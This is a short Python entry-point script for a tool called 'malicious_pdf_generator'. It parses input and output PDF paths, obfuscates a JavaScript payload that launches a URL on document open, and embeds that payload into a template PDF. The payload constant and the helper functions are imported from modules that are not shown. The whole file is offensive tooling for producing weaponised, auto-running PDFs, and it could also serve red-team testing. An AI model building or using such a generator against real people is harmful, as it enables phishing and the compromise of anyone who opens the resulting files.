from malicious_pdf_generator import obfuscated_code
from malicious_pdf_generator import embedded_javascript_into_pdf
from malicious_pdf_generator import const
import argparse


def cli():
    """
    Command-line interface for the malicious PDF generator.
    :return: argparse.Namespace: The parsed arguments.
    """
    parser = argparse.ArgumentParser(description="Generate a malicious PDF file.")
    parser.add_argument("-i", "--input",
                        help=const.INPUT_PDF_OPTION_HELP,
                        required=False,
                        default=const.INPUT_PDF_DEFAULT)
    parser.add_argument("-o", "--output",
                        help=const.OUTPUT_PDF_OPTION_HELP,
                        required=False,
                        default=const.OUTPUT_PDF_DEFAULT)
    arguments = parser.parse_args()

    return arguments


def generate_malicious_pdf(js_code, input_pdf, output_pdf):
    """
    Generates a malicious PDF file with embedded JavaScript code.
    :param js_code: javascript code
    :param input_pdf: template pdf file
    :param output_pdf: output pdf file
    :return:
    """
    embedded_javascript_into_pdf(obfuscated_code(js_code), input_pdf, output_pdf)
    print(f"JavaScript code embedded into {output_pdf}.")


def main():
    args = cli()
    generate_malicious_pdf(const.PAYLOAD_LAUNCH_URL_OPEN_ACTION, args.input, args.output)


if __name__ == "__main__":
    main()
